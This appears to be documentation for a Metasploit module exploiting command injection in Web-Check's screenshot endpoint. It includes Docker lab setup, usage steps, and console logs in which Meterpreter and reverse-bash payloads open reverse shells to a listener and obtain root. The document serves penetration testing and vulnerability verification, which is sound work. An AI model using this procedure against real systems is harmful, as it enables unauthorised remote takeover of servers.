## Vulnerable Application

This module exploits a command injection vulnerability in Web-Check's `/api/screenshot` endpoint.
The vulnerability exists in versions before commit 0e4958aa10b2650d32439a799f6fc83a7cd46cef.

1. Clone the repository and checkout the vulnerable version:
```
git clone https://github.com/Lissy93/web-check.git
cd web-check
git checkout 0e4958aa10b2650d32439a799f6fc83a7cd46cef~1
```

2. Create a `docker-compose.yml` file:
```
cat > docker-compose.yml << 'EOF'
services:
  web-check:
    container_name: web-check-vuln
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - 3000:3000
    environment:
      - CHROME_PATH=/usr/bin/chromium
      - PORT=3000
    restart: unless-stopped
EOF
```

3. Build and run with Docker:
```
docker compose up -d
```

4. Verify the application is running at http://localhost:3000

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/http/web_check_screenshot_rce`
3. Do: `set RHOSTS localhost`
4. Do: `set RPORT 3000`
5. Do: `set LHOST <docker_gateway_ip>`
6. Do: `run`
7. You should get a meterpreter session.

## Options

This module uses standard HTTP options.

## Scenarios

### Meterpreter Reverse TCP

```
msf > use exploit/multi/http/web_check_screenshot_rce
[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf exploit(multi/http/web_check_screenshot_rce) > set RHOSTS 172.23.0.2
RHOSTS => 172.23.0.2
msf exploit(multi/http/web_check_screenshot_rce) > set RPORT 3000
RPORT => 3000
msf exploit(multi/http/web_check_screenshot_rce) > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/web_check_screenshot_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf exploit(multi/http/web_check_screenshot_rce) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/web_check_screenshot_rce) > run
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Command injection vulnerability confirmed via sleep timing
[*] Sending stage (3090404 bytes) to 172.23.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.23.0.2:52296) at 2025-12-18 18:44:37 +0100

meterpreter > sysinfo
Computer     : 172.23.0.2
OS           : Debian 11.9 (Linux 6.14.0-116036-tuxedo)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### Reverse Shell Bash

```
msf > use exploit/multi/http/web_check_screenshot_rce
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(multi/http/web_check_screenshot_rce) > set RHOSTS 172.23.0.2
RHOSTS => 172.23.0.2
msf exploit(multi/http/web_check_screenshot_rce) > set RPORT 3000
RPORT => 3000
msf exploit(multi/http/web_check_screenshot_rce) > set PAYLOAD cmd/unix/reverse_bash
PAYLOAD => cmd/unix/reverse_bash
msf exploit(multi/http/web_check_screenshot_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf exploit(multi/http/web_check_screenshot_rce) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/web_check_screenshot_rce) > run
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Command injection vulnerability confirmed via sleep timing
[*] Command shell session 2 opened (172.17.0.1:4444 -> 172.23.0.2:44860) at 2025-12-18 18:46:23 +0100

id
uid=0(root) gid=0(root) groups=0(root)
echo "Hacking is good"
Hacking is good
```

